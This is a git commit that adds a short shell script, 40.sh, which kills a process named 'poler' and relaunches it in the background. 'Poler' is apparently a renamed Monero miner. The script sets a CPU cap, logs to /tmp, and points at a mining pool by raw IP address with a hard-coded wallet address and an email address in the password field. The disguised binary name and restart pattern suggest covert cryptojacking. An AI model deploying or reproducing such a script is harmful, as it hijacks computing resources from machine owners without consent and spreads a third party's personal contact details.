ef5acd9851bc693f8625f86eb4bdf07f16b30197
WilliamWizard <41175651+WilliamWizard@users.noreply.github.com>
2019-06-06 02:33:23 +0300

    b1

---
+++ 40.sh
@@ -0,0 +1,3 @@
+pkill poler
+sleep 7
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 82 --cpu-priority 3 -o 109.234.36.174:5950 -u 498JGhAsSUrijASh6ixJoEX7pBef9qSfDjhdEaExrS48WtftLHBczDgJHVGiDdEU59ERbk5qAwLQiB38xACSiDFZCkva7xY --pass=b1-pilot:robbertopp1@gmail.com -k
